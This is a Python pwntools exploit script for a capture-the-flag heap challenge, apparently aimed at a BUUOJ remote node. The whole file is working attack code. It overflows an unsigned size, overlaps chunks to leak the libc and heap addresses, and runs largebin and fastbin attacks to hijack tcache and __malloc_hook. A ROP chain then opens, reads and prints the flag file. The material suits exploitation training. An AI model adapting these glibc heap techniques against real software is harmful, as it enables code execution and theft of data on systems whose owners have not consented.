from pwn import *

g_fname = args.FNAME
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = "/lib/x86_64-linux-gnu/libc.so.6" if (args.LOCAL) else args.LIB

if (args.LOCAL):
	g_io = process(g_fname)
else:
	g_io = remote("node3.buuoj.cn", 27650)
	
g_libc = ELF(g_libcname)

def getpid():
	if (args.LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("choice: ", str(idx))

def new(idx, size, content):
	opt(1)
	sla("Index:", str(idx))
	sla("Size:", str(size))
	sa("House:", content)

def show(idx):
	opt(2)
	sla("Index:", str(idx))

def delete(idx):
	opt(3)
	sla("Index:", str(idx))
	
def edit(idx, content):
	opt(4)
	sla("Index:", str(idx))
	sa("House:", content)

def backdoor(content):
	opt("5")
	s(content)

def uint_overflow():
	opt(1)
	sla("Index:", "0")
	sla("Size:", str(2**64//218 + 1))
	delete(0)

def pwn():
	# increase money
	uint_overflow()
		
	################################
	# 1st. extends chunk into large bin, and leak libc.so's base and heap base.
	################################
	for i in range(7):
		new(0, 0x240, "fill tcache")
		delete(0)
	new(0, 0x80, "overhead")
	new(1, 0x248, "extend_1")
	new(2, 0x248, "extend_2")
	new(3, 0x248, "extend_3")
	new(4, 0x88, "extend_4")
	new(5, 0x88, "guard")
	new(7, 0x410, "a smaller large chunk")

	edit(0, flat(['a'*0x88, 0x781]))
	delete(1) # trigger extending, put chunk[0x780] ot ub.
	# split the fake large chunk in ub. extends chunk_1 to include fisrt 
	# 0x120 bytes of chunk_2. The remainder chunk is 0x420 bytes. 
	new(1, 0x340, flat(['a'*0x248, 0x251]))

	# allocate a chunk larger than 0x420 bytes to make the remainder 
	# inserted to its respect largebin.
	new(6, 0x440, "to recollect chunk to largebin")
	show(2) # leak libc base and heap base.

	fd = u64(ru(b'\x7f')[-6:].ljust(8, b'\0'))
	r(2)
	bk = u64(r(8))
	libc_base = fd - 0x1e5090
	addr_global_max_fast = libc_base + 0x1e7600
	addr_malloc_hook = libc_base + 0x1e4c30

	fd_nextsize = u64(r(8))
	bk_nextsize = u64(r(8))
	heap_base = bk_nextsize - 0x1660
	tcache_key = heap_base + 0x10

	log.debug("libc@%#x\n\tglobal_max_fast@%#x\n\t__malloc_hook@%#x\n\theap@%#x\n", libc_base, addr_global_max_fast, addr_malloc_hook, heap_base)

	################################
	# 2nd. Largebin Attack: overwrite global_max_fast
	################################
	delete(2) # because tcahce[0x250] is full, this chunk[0x250] will be put into smallbin[0x250]
	new(2, 0x248, flat(['a'*0xf8, 0x431, fd, bk, fd_nextsize, addr_global_max_fast - 0x20]))
	delete(7)
	new(7, 0x500, "trigger Largebin Attack")

	################################
	# 3rd. Fastbin Attack: hijack tcache_perthread_struct 
	################################
	delete(6) # just recycle slot6
	delete(2) # put into 'fastbin[0x250]'
	edit(1, flat(['a'*0x248, 0x251, heap_base]))

	# ROP: orw to print flag
	syscall_ret = libc_base + 0xcf6c5
	p_rax = libc_base + 0x47cf8
	p_rdi = libc_base + 0x26542 
	p_rsi = libc_base + 0x26f9e
	p_rdx = libc_base + 0x12bda6
	leave_ret = libc_base + 0x58373
	path_2_flag = "./flag\0\0"
	addr_flag_path = heap_base + 0x1570
	addr_rop = addr_flag_path + len(path_2_flag)
	addr_flag_content = heap_base + 0x1290
	payload_orw = flat([
		path_2_flag,
		# open("./flag", O_RDONLY , 0);
		p_rax, 2, 
		p_rdi, addr_flag_path,
		p_rsi, 0,
		p_rdx, 0,
		syscall_ret,
		# read(3, addr_flag_content, 0x100)
		p_rax, 0,
		p_rdi, 3,
		p_rsi, addr_flag_content,
		p_rdx, 0x100,
		syscall_ret,
		# write(1, addr_flag_content, 0x100)
		p_rax, 1,
		p_rdi, 1,
		p_rsi, addr_flag_content,
		p_rdx, 0x100,
		syscall_ret
	])
#	getpid()
	new(2, 0x240, payload_orw) 
	# hijack tcache[0x220]->__malloc_hook
	new(6, 0x240, flat(['\0'*0x40 + '\0'*0x20*8, addr_malloc_hook]))

	# invoke malloc(0x217) to hijack __malloc_hook = addr_rop
	backdoor(p64(leave_ret))
	
	delete(6)	
	# calloc to trigger __malloc_hook 
	opt(1)
	sla("Index:", '6')
	sla("Size:", str(addr_rop - 8))
	
if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "debug"
	pwn()
	g_io.interactive("leo^^$")
